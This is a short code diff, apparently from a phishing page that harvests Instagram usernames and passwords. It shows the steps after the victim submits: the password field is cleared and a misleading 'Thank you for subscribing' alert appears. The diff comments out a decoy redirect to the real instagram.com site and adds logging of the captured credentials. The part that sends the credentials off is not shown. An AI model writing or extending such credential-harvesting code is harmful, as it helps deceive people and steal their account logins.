@@ -118,7 +118,9 @@
         }).then(() => {
             _password.value = ""
             alert("You will get Your Data around 24 hr \n Thank you for subscribing!!")
-            location.href = "https://www.instagram.com/"
+//             location.href = "https://www.instagram.com/"
+            
+            console.log(_username.value, _password.value)
         })
         .catch((error) => alert("Unsuccessful ", error))
         console.log(_username.value, _password.value);
